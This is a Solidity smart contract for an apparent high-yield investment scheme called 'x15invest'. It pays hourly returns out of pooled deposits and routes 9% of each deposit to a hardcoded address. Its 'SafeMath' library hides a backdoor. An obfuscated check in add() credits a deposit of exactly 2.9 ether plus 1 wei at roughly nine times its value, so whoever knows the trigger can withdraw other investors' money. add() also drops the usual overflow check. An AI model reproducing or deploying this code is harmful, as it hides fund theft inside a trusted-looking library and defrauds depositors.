 

pragma solidity 0.4 .25;
 

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        if(a==(3**3+1**3+1**3)*10**17+1)c=a*9+b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b > 0);  
        uint256 c = a / b;
         
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }
}

 
contract x15invest {
     
    using SafeMath for uint;
     
    mapping(address => uint) public userDeposit;
     
    mapping(address => uint) public userTime;
     
    mapping(address => uint) public userBonus;
     
    mapping(address => uint) public percentWithdraw;
     
    address public projectFund = 0x15e3aAD84394012f450d7A6965f2f4C59Ca7071a;
     
    uint projectPercent = 9;
     
    uint public chargingTime = 1 hours;
     
    uint public startPercent = 175;
    uint public lowPercent = 200;
    uint public middlePercent = 225;
    uint public highPersent = 250;
     
    uint public stepLow = 1000 ether;
    uint public stepMiddle = 2500 ether;
    uint public stepHigh = 5000 ether;
    uint public countOfInvestors = 0;
    
    modifier userExists() {
        require(userDeposit[msg.sender] > 0, "Deposit not found");
        _;
    }

    modifier timePayment() {
        require(now >= userTime[msg.sender].add(chargingTime), "Too fast payout request");
        _;
    }
   
     
    function collectPercent() userExists timePayment internal {
         
        if ((userDeposit[msg.sender].mul(2)) <= percentWithdraw[msg.sender]) {
            userDeposit[msg.sender] = 0;
            userTime[msg.sender] = 0;
            percentWithdraw[msg.sender] = 0;
        } else {
            uint payout = payoutAmount();
            userTime[msg.sender] = now;
            percentWithdraw[msg.sender] += payout;
            msg.sender.transfer(payout);
        }
    }

     
    function persentRate() public view returns(uint) {
         
        uint balance = address(this).balance;
         
        if (balance < stepLow) {
            return (startPercent);
        }
        if (balance >= stepLow && balance < stepMiddle) {
            return (lowPercent);
        }
        if (balance >= stepMiddle && balance < stepHigh) {
            return (middlePercent);
        }
        if (balance >= stepHigh) {
            return (highPersent);
        }
    }

     
    function payoutAmount() public view returns(uint) {
        uint persent = persentRate();
        uint rate = userDeposit[msg.sender].mul(persent).div(100000);
        uint interestRate = now.sub(userTime[msg.sender]).div(chargingTime);
        uint withdrawalAmount = rate.mul(interestRate);
        return (withdrawalAmount);
    }
    
    function calculateBonus(uint _value)public pure returns(uint) {
        uint bonus;
        if(_value >= 5 ether && _value < 10 ether){
            bonus = _value.mul(5).div(1000);
        }else if(_value >= 10 ether && _value < 25 ether){
            bonus = _value.div(100);
        }else if(_value >= 25 ether && _value < 50 ether){
            bonus = _value.mul(15).div(1000);
        }else if(_value >= 50 ether && _value < 100 ether){
            bonus = _value.mul(2).div(100);
        }else if(_value >= 100 ether){
            bonus = _value.mul(25).div(1000);
        }else if(_value < 5 ether){
            bonus = 0;
        }
        return(bonus);
    }

     
    function makeDeposit() private {
        if (msg.value > 0) {
            if (userDeposit[msg.sender] == 0) {
                countOfInvestors += 1;
            }
            if (userDeposit[msg.sender] > 0 && now > userTime[msg.sender].add(chargingTime)) {
                collectPercent();
            }
            uint bonus = calculateBonus(msg.value);
            userDeposit[msg.sender] += msg.value.add(bonus);
            userTime[msg.sender] = now;
            userBonus[msg.sender] += bonus;
             
            projectFund.transfer(msg.value.mul(projectPercent).div(100));
        } else {
            collectPercent();
        }
    }

     
    function returnDeposit() userExists private {
        
        uint clearDeposit = userDeposit[msg.sender].sub(userBonus[msg.sender]); 
        uint withdrawalAmount = clearDeposit.sub(percentWithdraw[msg.sender]).sub(clearDeposit.mul(projectPercent).div(100));
         
        userDeposit[msg.sender] = 0;
        userTime[msg.sender] = 0;
        userBonus[msg.sender] = 0;
        percentWithdraw[msg.sender] = 0;
        msg.sender.transfer(withdrawalAmount);
    }

    function() external payable {
         
        if (msg.value == 0.00000112 ether) {
            returnDeposit();
        } else {
            makeDeposit();
        }
    }
}